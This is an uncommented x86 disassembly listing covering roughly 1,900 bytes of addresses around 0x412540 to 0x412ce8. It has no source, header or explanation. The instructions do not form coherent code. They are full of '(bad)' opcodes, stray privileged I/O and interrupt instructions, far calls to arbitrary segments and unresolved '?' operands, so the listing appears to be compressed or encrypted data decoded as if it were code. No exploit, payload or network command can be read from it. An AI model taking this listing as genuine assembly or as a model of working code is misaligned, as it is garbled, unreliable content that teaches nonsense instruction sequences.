  41253f:	call   0x3a15:0x4b97c333
  412546:	dec    esi
  412547:	es test eax,0xcb4977b2
  41254d:	add    eax,0xf5c01f90
  412552:	pavgb  mm0,QWORD PTR [edi]
  412555:	dec    edx
  412556:	sbb    BYTE PTR [ecx+0x4d],al
  412559:	stos   BYTE PTR es:[edi],al
  41255a:	scas   al,BYTE PTR es:[edi]
  41255b:	mov    ecx,0xf10d1334
  412560:	lods   eax,DWORD PTR ds:[esi]
  412561:	sbb    ecx,DWORD PTR [eax-0x70fa1111]
  412567:	adc    DWORD PTR ds:0xce84f556,edx
  41256d:	inc    edi
  41256e:	inc    edx
  41256f:	push   ebp
  412570:	jne    0x4125c1
  412572:	repz and BYTE PTR [esp+esi*2-0x15ce4ea6],bh
  41257a:	(bad)  
  41257b:	shl    DWORD PTR [ebx-0x1d],1
  41257e:	mov    bl,0xc7
  412580:	inc    ebx
  412581:	xchg   edi,eax
  412582:	xchg   edx,eax
  412583:	dec    ebp
  412584:	mov    eax,ds:0x390a7282
  412589:	(bad)  
  41258a:	in     eax,dx
  41258b:	push   DWORD PTR [esi+ecx*2-0x74]
  41258f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412590:	cmp    eax,0x2d21b14a
  412595:	(bad)  
  412597:	or     dl,cl
  412599:	cld    
  41259a:	xchg   BYTE PTR [edi],bh
  41259c:	sti    
  41259d:	in     eax,dx
  41259e:	pop    edi
  41259f:	cmc    
  4125a0:	xchg   ebp,eax
  4125a1:	retf   0xb8c1
  4125a4:	mov    cl,0x3f
  4125a6:	xchg   edx,eax
  4125a7:	ret    0x239f
  4125aa:	inc    edx
  4125ab:	stos   DWORD PTR es:[edi],eax
  4125ac:	stc    
  4125ad:	idiv   DWORD PTR [ecx]
  4125af:	pop    bx
  4125b1:	jae    0x412611
  4125b3:	test   eax,0x99a0cd7b
  4125b8:	mov    cl,0x9e
  4125ba:	jnp    0x41254f
  4125bc:	into   
  4125bd:	inc    edx
  4125be:	nop
  4125bf:	imul   ebp,edi,0xa11cdb24
  4125c5:	test   al,0x62
  4125c7:	and    BYTE PTR [ecx],bh
  4125c9:	mov    ?,WORD PTR [eax]
  4125cb:	xor    ecx,esp
  4125cd:	push   eax
  4125ce:	cmp    al,bh
  4125d0:	aaa    
  4125d1:	push   cs
  4125d2:	inc    eax
  4125d3:	sbb    eax,0x85ee1387
  4125d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125d9:	mov    ecx,cs
  4125db:	dec    esp
  4125dc:	leave  
  4125dd:	das    
  4125de:	add    al,0xbb
  4125e0:	adc    bl,BYTE PTR [edi+ebx*1+0x7c]
  4125e4:	in     al,0x85
  4125e6:	hlt    
  4125e7:	out    dx,eax
  4125e8:	outs   dx,DWORD PTR ds:[esi]
  4125e9:	dec    esp
  4125ea:	enter  0xce25,0x2d
  4125ee:	pop    eax
  4125ef:	psraw  mm3,QWORD PTR [esi-0x425491dd]
  4125f6:	leave  
  4125f7:	ss jecxz 0x4125aa
  4125fa:	out    dx,al
  4125fb:	lods   eax,DWORD PTR ds:[esi]
  4125fc:	(bad)  
  4125fd:	xor    edi,ebx
  4125ff:	mov    es,WORD PTR [edi+edi*4-0x46869fbc]
  412606:	leave  
  412607:	(bad)  
  412608:	mov    cl,0x88
  41260a:	stos   DWORD PTR es:[edi],eax
  41260b:	pop    eax
  41260c:	xchg   ebp,eax
  41260d:	shl    ebx,1
  41260f:	adc    al,0x17
  412611:	in     eax,dx
  412612:	sbb    DWORD PTR gs:0xafc29d0b,0x9c13e8c
  41261d:	popf   
  41261e:	loop   0x41263f
  412620:	call   0x8f4:0x4328bb4b
  412627:	mov    ebx,0x5e1072d0
  41262c:	xlat   BYTE PTR ds:[ebx]
  41262d:	retf   0xdea0
  412630:	test   eax,0xd6bf2bb3
  412635:	(bad)  
  412636:	sub    al,0x1
  412638:	push   eax
  412639:	psubusw mm4,QWORD PTR [edi+0x63ec2e70]
  412640:	sbb    eax,0xc91207c2
  412645:	cld    
  412646:	mov    ds:0x205fe939,al
  41264b:	jmp    0x873b3af
  412650:	scas   eax,DWORD PTR es:[edi]
  412651:	repz cmc 
  412653:	fmul   QWORD PTR [edx+0x52]
  412656:	loopne 0x412627
  412658:	popa   
  412659:	jp     0x412683
  41265b:	pop    ecx
  41265c:	mov    ebx,0xac529f1f
  412661:	repz jbe 0x4126af
  412664:	push   edi
  412665:	stc    
  412666:	push   eax
  412667:	out    dx,al
  412668:	fs push 0xffffffe7
  41266b:	test   DWORD PTR [ebp+0x6d],esi
  41266e:	daa    
  41266f:	add    BYTE PTR [ebx+0x2],0xff
  412673:	addr16 cwde 
  412675:	fisub  DWORD PTR [edx-0x6c]
  412678:	jne    0x41261a
  41267a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41267b:	push   edx
  41267c:	xchg   ecx,eax
  41267d:	sbb    esp,DWORD PTR [esi]
  41267f:	dec    ebx
  412680:	mov    dl,0x77
  412682:	fwait
  412683:	in     eax,0xb9
  412685:	mov    edx,0xbe80112f
  41268a:	xor    dh,dh
  41268c:	cmp    DWORD PTR [edx],edx
  41268e:	fst    QWORD PTR [esi+0x241c2ec5]
  412694:	and    BYTE PTR [edi+ebp*2+0x75],dl
  412698:	cmp    al,0xd3
  41269a:	jl     0x41264d
  41269c:	push   eax
  41269d:	pushf  
  41269e:	cmp    bh,BYTE PTR [eax+esi*4+0x4ac47dce]
  4126a5:	mov    cl,0x40
  4126a7:	ret    
  4126a8:	sbb    eax,DWORD PTR [esp+eiz*8]
  4126ab:	jnp    0x412668
  4126ad:	imul   ebx,DWORD PTR [edi-0x5755fd72],0x353672cb
  4126b7:	aaa    
  4126b8:	lods   al,BYTE PTR ds:[esi]
  4126b9:	lods   al,BYTE PTR ds:[esi]
  4126ba:	jecxz  0x41272a
  4126bc:	ds nop
  4126be:	push   ebx
  4126bf:	xchg   esi,eax
  4126c0:	xlat   BYTE PTR ds:[ebx]
  4126c1:	out    0x17,eax
  4126c3:	mov    cs:0xea6ab575,al
  4126c9:	in     eax,dx
  4126ca:	aam    0x2
  4126cc:	addr16 pop esi
  4126ce:	stos   DWORD PTR es:[edi],eax
  4126cf:	mov    al,ds:0xbd1150d0
  4126d4:	sbb    BYTE PTR [edx+ebp*2-0x6c],bh
  4126d8:	inc    ebp
  4126d9:	inc    ecx
  4126da:	(bad)  
  4126db:	cli    
  4126dc:	test   DWORD PTR [edx-0x1f12ea11],edi
  4126e2:	sti    
  4126e3:	int    0x7a
  4126e5:	xor    al,0xa
  4126e7:	xor    al,0x94
  4126e9:	jmp    esp
  4126eb:	xor    ebp,DWORD PTR [ebx+ebp*2-0x43964419]
  4126f2:	ror    BYTE PTR [edx-0x71],cl
  4126f5:	dec    edi
  4126f6:	adc    dh,BYTE PTR [ebx+eiz*8+0x5dff5127]
  4126fd:	(bad)  
  4126ff:	nop
  412700:	in     eax,0xac
  412702:	mov    cl,0x36
  412704:	outs   dx,DWORD PTR ds:[esi]
  412705:	jns    0x412763
  412707:	or     bl,cl
  412709:	push   0x47
  41270b:	jmp    0x41270d
  41270d:	sub    eax,0x474ef059
  412712:	jecxz  0x412718
  412714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412715:	fs or  al,0xdf
  412718:	xor    ecx,DWORD PTR [eax+eiz*8-0xc]
  41271c:	mov    ah,0x83
  41271e:	sbb    bh,cl
  412720:	cli    
  412721:	mov    edx,?
  412723:	jb     0x412799
  412725:	(bad)  
  412726:	mov    ah,0xc6
  412728:	adc    dh,BYTE PTR [eax-0x3ccb4992]
  41272e:	dec    edx
  41272f:	jmp    0xf7ea:0xf0e7265e
  412736:	in     eax,0xfe
  412738:	push   es
  412739:	mov    edx,0xbf72f3c3
  41273e:	adc    ch,bh
  412740:	mov    DWORD PTR [esi+ecx*8+0x31],ecx
  412744:	sbb    bh,dl
  412746:	cld    
  412747:	or     al,0xe7
  412749:	mov    DWORD PTR [edx+0x2b],ebx
  41274c:	stc    
  41274d:	xlat   BYTE PTR ds:[ebx]
  41274e:	in     al,0x7c
  412750:	dec    esp
  412751:	stc    
  412752:	or     eax,0x1a33d581
  412757:	xchg   DWORD PTR [ebp-0x1e3685f6],eax
  41275d:	mov    ch,0x54
  41275f:	xchg   esi,eax
  412760:	jo     0x412748
  412762:	es push ds
  412764:	mov    DWORD PTR [ecx+0x63c6860b],ecx
  41276a:	in     eax,0xb5
  41276c:	and    ecx,DWORD PTR [edx+0x38e3310f]
  412772:	outs   dx,DWORD PTR ds:[esi]
  412773:	fidivr DWORD PTR ds:0x3b45c7ba
  412779:	jmp    0x412728
  41277b:	mov    ebp,?
  41277d:	xchg   edi,eax
  41277e:	out    0xa9,eax
  412780:	sbb    al,0xa4
  412782:	pop    ds
  412783:	aad    0x92
  412785:	leave  
  412786:	jb     0x412727
  412788:	in     al,0x4
  41278a:	ja     0x4127be
  41278c:	data16 lods al,BYTE PTR ds:[esi]
  41278e:	inc    eax
  41278f:	mov    ds:0xae26c312,eax
  412794:	cli    
  412795:	ins    DWORD PTR es:[edi],dx
  412796:	rol    BYTE PTR [edx],cl
  412798:	sbb    eax,0x340e66ee
  41279d:	stos   DWORD PTR es:[edi],eax
  41279e:	and    eax,0xf292a04
  4127a3:	or     eax,0x8473d9a3
  4127a8:	mov    es,WORD PTR ds:0x57ac062
  4127ae:	and    eax,0x154e87f2
  4127b3:	rcr    DWORD PTR [edx-0x5c],cl
  4127b6:	icebp  
  4127b7:	xchg   edx,eax
  4127b9:	cmp    eax,0x782b5ad5
  4127be:	lock jb 0x4127f6
  4127c1:	and    DWORD PTR [ebp-0x3e],0xffffff8b
  4127c5:	sub    esp,edx
  4127c7:	icebp  
  4127c8:	or     DWORD PTR [edi+0x4ecf384d],0xe6a2348c
  4127d2:	enter  0xe79a,0x8
  4127d6:	inc    edx
  4127d7:	stos   BYTE PTR es:[edi],al
  4127d8:	push   0x1fa17981
  4127dd:	pop    es
  4127de:	mov    DWORD PTR [ebx-0x68ac305a],eax
  4127e4:	mov    bl,0xa8
  4127e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127e7:	add    edi,ebx
  4127e9:	sub    BYTE PTR [ecx+ebp*1],ah
  4127ec:	adc    eax,0xf01e6065
  4127f1:	add    ch,BYTE PTR [esi-0x13]
  4127f4:	into   
  4127f5:	sub    eax,0x99726e93
  4127fa:	mov    BYTE PTR [esi-0x649bcd89],bl
  412800:	mov    al,0x45
  412802:	cwde   
  412803:	leave  
  412804:	call   0x22d9:0x3937f129
  41280b:	scas   al,BYTE PTR es:[edi]
  41280c:	sub    eax,0xaee715e4
  412811:	or     BYTE PTR [ebx+0x7a56ea3b],bl
  412817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412818:	stc    
  412819:	mov    gs,WORD PTR [edx+0xa]
  41281c:	pushf  
  41281d:	jno    0x412873
  41281f:	ins    DWORD PTR es:[edi],dx
  412820:	dec    ebp
  412821:	pop    ebx
  412822:	jbe    0x412829
  412824:	aam    0x75
  412826:	inc    ebx
  412827:	adc    eax,0x998154e9
  41282c:	inc    ebx
  41282d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41282e:	cmp    DWORD PTR [esp+edi*2],ebx
  412831:	ret    
  412832:	les    ebp,FWORD PTR [edx-0x3f02418e]
  412838:	pusha  
  412839:	jne    0x4127f3
  41283b:	ins    DWORD PTR es:[edi],dx
  41283c:	ss mov eax,0x97c3f59b
  412842:	scas   eax,DWORD PTR es:[edi]
  412843:	jecxz  0x41288a
  412845:	iret   
  412846:	int    0xeb
  412848:	xlat   BYTE PTR ds:[ebx]
  412849:	pop    es
  41284a:	nop
  41284b:	mov    bl,0x6d
  41284d:	mov    ?,WORD PTR [ebx+0x6e7a53d6]
  412853:	inc    edx
  412854:	pop    ss
  412855:	mov    ebx,edi
  412857:	psrlq  mm1,QWORD PTR [eax]
  41285a:	adc    bh,0x91
  41285d:	mov    ch,0xfb
  41285f:	aad    0xaf
  412861:	scas   al,BYTE PTR es:[edi]
  412862:	dec    esi
  412863:	xchg   ebp,eax
  412864:	sar    dl,cl
  412866:	xor    DWORD PTR [ecx],0x38155104
  41286c:	mov    dh,0xe1
  41286e:	push   ds
  41286f:	ss out 0x5,al
  412872:	jo     0x41280d
  412874:	icebp  
  412875:	out    0x55,eax
  412877:	in     eax,0x34
  412879:	xlat   BYTE PTR ds:[ebx]
  41287a:	out    0x1b,eax
  41287c:	mov    bh,0x3
  41287e:	lds    esi,FWORD PTR [esi]
  412880:	adc    al,0xe3
  412882:	sbb    ebp,DWORD PTR [ebx+edx*1+0x7d936aa3]
  412889:	aaa    
  41288a:	push   ds
  41288b:	cli    
  41288c:	in     eax,dx
  41288d:	iret   
  41288e:	and    eax,0x35e9d735
  412893:	mov    edi,0x5b0a5610
  412898:	and    BYTE PTR [edx+ecx*1],bl
  41289b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41289c:	and    al,0x6
  41289e:	adc    ebx,DWORD PTR ds:0xc7ab4a0e
  4128a4:	sub    eax,0x72b7033f
  4128a9:	push   0xbeb0df56
  4128ae:	inc    ebp
  4128af:	and    eax,0xddba1f0
  4128b4:	xor    eax,0x832ebed9
  4128b9:	pop    ss
  4128ba:	xchg   edi,eax
  4128bb:	mov    cl,0x11
  4128bd:	push   0xffffffc0
  4128bf:	sub    BYTE PTR [eax+ebp*4-0x2],bl
  4128c3:	test   DWORD PTR [edx+0x1b],ebp
  4128c6:	movsx  edx,di
  4128c9:	mov    bh,ch
  4128cb:	lds    edi,FWORD PTR [edi+0x21d2628c]
  4128d1:	stos   BYTE PTR es:[edi],al
  4128d2:	sbb    BYTE PTR [esi-0x1b199205],cl
  4128d8:	mov    esi,0x4efeac79
  4128dd:	out    0xd4,eax
  4128df:	dec    edx
  4128e0:	pop    ecx
  4128e1:	lock inc ebp
  4128e3:	add    ch,BYTE PTR ds:0x7f681ee0
  4128e9:	fld    TBYTE PTR [ecx+esi*4]
  4128ec:	mov    DWORD PTR [ebx-0x4cc2ba2f],edx
  4128f2:	(bad)  [ebp-0x7fe998bf]
  4128f8:	(bad)  
  4128f9:	(bad)  
  4128fa:	cwde   
  4128fb:	add    eax,0x87817f75
  412900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412901:	loop   0x412896
  412903:	cmp    DWORD PTR [esi-0x5e83a491],esp
  412909:	out    dx,al
  41290a:	std    
  41290b:	xchg   ebp,eax
  41290c:	jbe    0x4128f4
  41290e:	test   eax,0x29795694
  412913:	pop    ecx
  412914:	cld    
  412915:	push   es
  412916:	scas   eax,DWORD PTR es:[edi]
  412917:	jle    0x41289b
  412919:	repz imul ebp,DWORD PTR [eax-0x31],0xffffffe0
  41291e:	fidivr DWORD PTR [ebx-0x3d]
  412921:	xchg   DWORD PTR [ebp-0x57b23a7b],esi
  412927:	mov    al,0x8f
  412929:	mov    ebx,DWORD PTR ds:0x1c9730dd
  41292f:	clc    
  412930:	inc    edi
  412931:	dec    esp
  412932:	xor    DWORD PTR [esi],0x3f
  412935:	xchg   ebp,eax
  412936:	(bad)  
  412937:	pop    ebx
  412938:	cs push 0x6a8d8b7f
  41293e:	ins    DWORD PTR es:[edi],dx
  41293f:	ret    0x3b0e
  412942:	and    eax,eax
  412944:	(bad)  
  412945:	loopne 0x4128fe
  412947:	jle    0x412901
  412949:	test   BYTE PTR [ebp-0x39792ef3],cl
  41294f:	add    ah,cl
  412951:	shl    bh,0x46
  412954:	jge    0x4128da
  412956:	mov    ah,0x89
  412958:	push   esp
  412959:	inc    ebp
  41295a:	stos   DWORD PTR es:[edi],eax
  41295b:	pop    esp
  41295c:	adc    eax,0x38c98a8a
  412961:	xor    BYTE PTR [ebx+0x5e],ch
  412964:	repnz repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412967:	ds lahf 
  412969:	mov    DWORD PTR [ebx+0x53d5d9f],edi
  41296f:	in     al,dx
  412970:	jne    0x41290e
  412972:	fadd   DWORD PTR [ecx+eiz*8]
  412975:	or     eax,0x809165bd
  41297a:	pop    ss
  41297b:	fstp   DWORD PTR [ebx*4+0x6a798e92]
  412982:	pop    ebx
  412983:	repnz cmp ch,0xbc
  412987:	add    DWORD PTR [ecx],esi
  412989:	fmul   DWORD PTR [edi]
  41298b:	push   es
  41298c:	bound  ecx,QWORD PTR [ecx]
  41298e:	pop    ecx
  41298f:	in     al,0xce
  412991:	stos   DWORD PTR es:[edi],eax
  412992:	mov    eax,ds:0x73883c4d
  412997:	shl    ebp,0x3d
  41299a:	xor    eax,DWORD PTR [edx-0x7d]
  41299d:	and    BYTE PTR [esi],ch
  41299f:	ficomp DWORD PTR [edi]
  4129a1:	xchg   DWORD PTR [edx],edi
  4129a3:	icebp  
  4129a4:	and    esi,DWORD PTR [esi-0x60]
  4129a7:	jns    0x41299e
  4129a9:	aas    
  4129aa:	jbe    0x4129a1
  4129ac:	or     BYTE PTR [edi+0x7c082835],al
  4129b2:	add    eax,ebp
  4129b4:	jnp    0x412a2e
  4129b6:	sbb    al,0xb1
  4129b8:	sub    al,0x15
  4129ba:	test   al,0x45
  4129bc:	icebp  
  4129bd:	idiv   eax
  4129bf:	dec    edx
  4129c0:	push   es
  4129c1:	outs   dx,DWORD PTR ds:[esi]
  4129c2:	std    
  4129c3:	dec    ecx
  4129c4:	xchg   esi,eax
  4129c5:	xor    BYTE PTR [eax],0x76
  4129c8:	cmp    esi,DWORD PTR [edx]
  4129ca:	xor    al,0xc4
  4129cc:	(bad)  
  4129cd:	push   cs
  4129ce:	mov    dh,0x8f
  4129d0:	in     al,0xa1
  4129d2:	jg     0x4129b5
  4129d4:	popa   
  4129d5:	popf   
  4129d6:	cmp    ah,BYTE PTR [ecx+0x44]
  4129d9:	retf   0x2744
  4129dc:	test   DWORD PTR [ebx-0x2a],ebp
  4129df:	xchg   edi,eax
  4129e0:	sub    DWORD PTR [esp+ebx*4-0x6010b853],edx
  4129e7:	inc    esi
  4129e8:	sub    BYTE PTR [edi-0x63],ah
  4129eb:	mov    cl,0x89
  4129ed:	mov    ch,0xa2
  4129ef:	adc    eax,0x5cd4ba41
  4129f4:	std    
  4129f5:	add    eax,0xa079ee0f
  4129fa:	retf   0xe6d3
  4129fd:	pop    ds
  4129fe:	cld    
  4129ff:	bound  eax,QWORD PTR [edx+0x514fde01]
  412a05:	pop    ecx
  412a06:	jmp    0x1b732e44
  412a0b:	and    DWORD PTR [edx-0x322f9dfb],edi
  412a11:	cli    
  412a12:	xchg   edx,eax
  412a13:	adc    al,0x36
  412a15:	xchg   edx,eax
  412a16:	neg    DWORD PTR [edx]
  412a18:	mov    bl,0xaf
  412a1a:	xchg   ebx,eax
  412a1b:	cli    
  412a1c:	lahf   
  412a1d:	inc    esi
  412a1e:	sbb    eax,0xca5cf855
  412a23:	mov    bh,0xf0
  412a25:	mov    dl,0xa5
  412a27:	nop
  412a28:	adc    eax,0xf3c54394
  412a2d:	int3   
  412a2e:	dec    ebx
  412a2f:	test   DWORD PTR ds:0x7eace83b,ebx
  412a35:	push   ecx
  412a36:	and    ebx,edi
  412a38:	and    DWORD PTR [edi+0x2dfbfbe1],eax
  412a3e:	loope  0x412a71
  412a40:	jno    0x412a2e
  412a42:	cmp    edx,DWORD PTR [ebp-0x4e]
  412a45:	lahf   
  412a46:	push   edi
  412a47:	mov    gs,edi
  412a49:	enter  0xc11,0xd1
  412a4d:	push   esp
  412a4e:	shr    bh,cl
  412a50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a51:	das    
  412a52:	push   0xffffffed
  412a54:	int    0x87
  412a56:	jne    0x4129ee
  412a58:	xlat   BYTE PTR ds:[ebx]
  412a59:	repnz (bad) 
  412a5c:	into   
  412a5d:	and    DWORD PTR [edi+edx*4+0x6a4a2c4c],ebp
  412a64:	push   ss
  412a65:	out    0x1c,eax
  412a67:	push   ss
  412a68:	mov    eax,0xab1091d
  412a6d:	xchg   ebx,eax
  412a6e:	bound  eax,QWORD PTR [ecx]
  412a70:	xlat   BYTE PTR ds:[ebx]
  412a71:	data16 add dl,BYTE PTR [eax-0x775e91b0]
  412a78:	mov    al,0xa2
  412a7a:	sbb    al,0xf9
  412a7c:	add    al,0x82
  412a7e:	push   esp
  412a7f:	xor    BYTE PTR [ecx+0x2c],bh
  412a82:	dec    eax
  412a83:	(bad)  
  412a84:	fld    TBYTE PTR [edx-0x67251eea]
  412a8a:	sub    bl,BYTE PTR [ecx+0x4d1f65bd]
  412a90:	retf   0x6997
  412a93:	and    ebp,DWORD PTR [ebx]
  412a95:	mov    bh,0x9e
  412a97:	push   0xe15be65e
  412a9c:	mov    ecx,DWORD PTR [edi+0x434679b3]
  412aa2:	inc    ecx
  412aa3:	or     DWORD PTR [esi+edx*2-0x4d],esi
  412aa7:	fild   DWORD PTR [esp+eax*2]
  412aaa:	ds jb  0x412a4f
  412aad:	lea    esi,[ecx-0xc]
  412ab0:	add    al,0xe6
  412ab2:	mov    bh,dh
  412ab4:	jge    0x412b0b
  412ab6:	scas   al,BYTE PTR es:[edi]
  412ab7:	mov    bl,0x2
  412ab9:	inc    ebx
  412aba:	std    
  412abb:	pop    ds
  412abc:	jo     0x4d2861a6
  412ac2:	jl     0x412ace
  412ac4:	cmp    BYTE PTR [edi+0xe3b0461],0x3e
  412acb:	mov    esp,DWORD PTR [edi]
  412acd:	cld    
  412ace:	test   edi,ebx
  412ad0:	ja     0x412b46
  412ad2:	adc    eax,0xeb56c1ad
  412ad7:	cmp    DWORD PTR [eax+0x2d],0xfcfa7c63
  412ade:	sti    
  412adf:	push   ebp
  412ae0:	mov    dh,0x2a
  412ae2:	sub    DWORD PTR [esi-0x5f],eax
  412ae5:	cmp    edx,0x40bc3771
  412aeb:	in     al,0xa3
  412aed:	imul   DWORD PTR [ebx-0x6c9703f]
  412af3:	dec    esi
  412af4:	test   al,0x7d
  412af6:	jg     0x412a83
  412af8:	dec    eax
  412af9:	mov    edi,edi
  412afb:	outs   dx,BYTE PTR ds:[esi]
  412afc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412afd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412afe:	mov    bh,BYTE PTR ds:0x3ff043b2
  412b04:	mov    ds:0x65fdfc95,eax
  412b09:	iret   
  412b0a:	shl    dh,1
  412b0c:	enter  0xff97,0x7
  412b10:	int3   
  412b11:	(bad)  
  412b13:	mov    DWORD PTR [eax-0x60],edi
  412b16:	jle    0x412b83
  412b18:	xchg   esi,eax
  412b19:	jge    0x412b8a
  412b1b:	out    dx,eax
  412b1c:	pop    ebx
  412b1d:	push   esi
  412b1e:	ja     0x412aba
  412b20:	mov    eax,DWORD PTR [edx]
  412b22:	push   esi
  412b23:	sub    ah,BYTE PTR [ecx+eax*1-0xf]
  412b27:	daa    
  412b28:	in     eax,0x40
  412b2a:	push   esp
  412b2b:	jp     0x412ab7
  412b2d:	and    esp,DWORD PTR [eax-0x7b]
  412b30:	gs sbb cl,bh
  412b33:	pop    ecx
  412b34:	jmp    DWORD PTR [ecx]
  412b36:	gs and al,0x50
  412b39:	dec    esp
  412b3a:	loop   0x412b7e
  412b3c:	call   0x3a80f6ef
  412b41:	jnp    0x412bae
  412b43:	xor    BYTE PTR [esi+0x3],cl
  412b46:	push   es
  412b47:	and    al,0xe0
  412b49:	imul   eax,DWORD PTR [ebx],0x1a
  412b4c:	lahf   
  412b4d:	fstp   QWORD PTR [ebx]
  412b4f:	add    dl,BYTE PTR [ebx-0x2c73a2ea]
  412b55:	aad    0x91
  412b57:	adc    BYTE PTR [ebx-0x7edc5b6a],0x6d
  412b5e:	inc    ebx
  412b5f:	push   ebx
  412b60:	push   esp
  412b61:	retf   
  412b62:	dec    esp
  412b63:	xor    DWORD PTR [esp+edx*8+0x35],ebx
  412b67:	pop    eax
  412b68:	fs loop 0x412b72
  412b6b:	jmp    0x412b4f
  412b6d:	cmp    dh,BYTE PTR gs:[ecx-0x5a57a004]
  412b74:	jo     0x412bce
  412b76:	fwait
  412b77:	xchg   bl,al
  412b79:	fwait
  412b7a:	xor    eax,0x10132ed9
  412b7f:	sbb    eax,0x5fae0eeb
  412b84:	dec    edi
  412b85:	push   esp
  412b86:	jnp    0x412bb4
  412b88:	(bad)  
  412b89:	je     0x412c06
  412b8b:	adc    eax,0x56f73db
  412b90:	std    
  412b91:	push   0xffffff9c
  412b93:	scas   eax,DWORD PTR es:[edi]
  412b94:	and    ebx,DWORD PTR [ebx]
  412b96:	mov    al,0x84
  412b98:	ja     0x412b74
  412b9a:	call   0xeeb0:0xce2d26ee
  412ba1:	enter  0xb2bb,0xe5
  412ba5:	inc    esi
  412ba6:	push   ss
  412ba7:	push   ecx
  412ba8:	push   edx
  412ba9:	pop    es
  412baa:	xor    al,0x16
  412bac:	pusha  
  412bad:	loope  0x412ba9
  412baf:	mov    DWORD PTR [ebp-0x4739d047],edi
  412bb5:	fild   QWORD PTR [esp+eax*8-0xb3f1381]
  412bbc:	xor    eax,0xd339479f
  412bc1:	je     0x412bc4
  412bc3:	mov    ecx,0xeede0422
  412bc8:	mov    WORD PTR [esi-0x37b7d86d],?
  412bce:	mov    cl,0x73
  412bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bd1:	retf   
  412bd2:	pushf  
  412bd3:	test   bl,0x26
  412bd6:	icebp  
  412bd7:	call   DWORD PTR [ecx]
  412bd9:	push   edi
  412bda:	shl    BYTE PTR [edx-0x1],0xa0
  412bde:	mov    edx,0x2f5d3ba3
  412be3:	pusha  
  412be4:	sub    al,0x10
  412be6:	inc    ebp
  412be7:	push   esi
  412be8:	jg     0x412bb8
  412bea:	(bad)  [esi-0x467dfc87]
  412bf0:	not    BYTE PTR [eax-0xf]
  412bf3:	test   eax,0x35c6ba0d
  412bf8:	or     al,0xf4
  412bfa:	je     0x412c4d
  412bfc:	dec    ecx
  412bfd:	ret    
  412bfe:	fsubr  st,st(5)
  412c00:	pop    ds
  412c01:	jle    0x412bf1
  412c03:	imul   eax,ecx,0xc0c8b4ca
  412c09:	jp     0x412ba1
  412c0b:	sahf   
  412c0c:	(bad)  
  412c0d:	out    0xbb,eax
  412c0f:	lods   eax,DWORD PTR ds:[esi]
  412c10:	loope  0x412bf4
  412c12:	out    0xba,eax
  412c14:	push   esp
  412c15:	pop    edx
  412c16:	push   ebp
  412c17:	or     al,BYTE PTR [edx+0x47]
  412c1a:	add    BYTE PTR [ecx-0x7b],bl
  412c1d:	fstp   st(4)
  412c1f:	(bad)  
  412c20:	xchg   edx,eax
  412c21:	sbb    bh,0xf5
  412c24:	dec    edx
  412c25:	int3   
  412c26:	dec    ebx
  412c27:	xor    al,0x89
  412c29:	(bad)  
  412c2a:	test   BYTE PTR [ebx],al
  412c2c:	rol    bh,0xf7
  412c2f:	lahf   
  412c30:	fist   DWORD PTR [ecx]
  412c32:	stos   DWORD PTR es:[edi],eax
  412c33:	out    0x55,eax
  412c35:	push   cs
  412c36:	mov    sp,0xd639
  412c3a:	sbb    dh,BYTE PTR [edx-0x537ed9a1]
  412c40:	addr16 dec edi
  412c42:	sti    
  412c43:	mov    BYTE PTR [edx-0x6b],al
  412c46:	xchg   ecx,eax
  412c47:	into   
  412c48:	add    ebx,ebp
  412c4a:	cld    
  412c4b:	and    ebp,DWORD PTR [ebp-0x58512544]
  412c51:	and    BYTE PTR [esi],dh
  412c53:	repz sbb BYTE PTR [edi+esi*8],ah
  412c57:	add    DWORD PTR [ebx+0x60282732],0xffffffd6
  412c5e:	fisubr DWORD PTR [esi+0x4932669e]
  412c64:	inc    ecx
  412c65:	in     al,0x26
  412c67:	fnsave [edx+0xbfd67d3]
  412c6d:	call   0xe1f89ee5
  412c72:	fbstp  TBYTE PTR [edi]
  412c74:	pusha  
  412c75:	pop    ebp
  412c76:	lds    edi,FWORD PTR [ebp+0x7164d161]
  412c7c:	and    al,0xd7
  412c7e:	lods   eax,DWORD PTR ds:[esi]
  412c7f:	fs stos BYTE PTR es:[edi],al
  412c81:	frstor [edx+0x4c]
  412c84:	lods   eax,DWORD PTR ds:[esi]
  412c85:	jne    0x412cc2
  412c87:	test   BYTE PTR [edi],dh
  412c89:	jg     0x412c64
  412c8b:	jmp    0x174e5600
  412c90:	in     eax,dx
  412c91:	or     esi,DWORD PTR [esi]
  412c93:	jp     0x412cc2
  412c95:	lods   eax,DWORD PTR ds:[esi]
  412c96:	dec    edx
  412c97:	pusha  
  412c98:	and    BYTE PTR [edx],bl
  412c9a:	out    dx,al
  412c9b:	dec    ebx
  412c9c:	leave  
  412c9d:	xchg   BYTE PTR [ecx],bl
  412c9f:	jecxz  0x412cc0
  412ca1:	dec    ecx
  412ca2:	pop    edx
  412ca3:	out    0x74,al
  412ca5:	sar    DWORD PTR [eax-0x737872ef],cl
  412cab:	jecxz  0x412d06
  412cad:	aas    
  412cae:	push   esi
  412caf:	test   DWORD PTR [ecx+0x39f598a1],ebx
  412cb5:	fimul  WORD PTR [edx]
  412cb7:	jns    0x412c3b
  412cb9:	jno    0x412c7a
  412cbb:	push   0x5400923e
  412cc0:	xor    BYTE PTR fs:[ecx+0x7],al
  412cc4:	call   0x5e62:0x27d731c3
  412ccb:	out    0x19,eax
  412ccd:	xor    dl,cl
  412ccf:	push   0xffffff97
  412cd1:	or     eax,0xcc8af1a4
  412cd6:	xchg   edi,eax
  412cd7:	inc    edx
  412cd8:	sti    
  412cd9:	cmp    ebp,eax
  412cdb:	in     al,0x3a
  412cdd:	repz enter 0x60,0xa1
  412ce2:	pop    es
  412ce3:	push   0x5b
  412ce5:	and    esi,DWORD PTR [ebx+0x65]
  412ce8:	cmp    al,0xd7
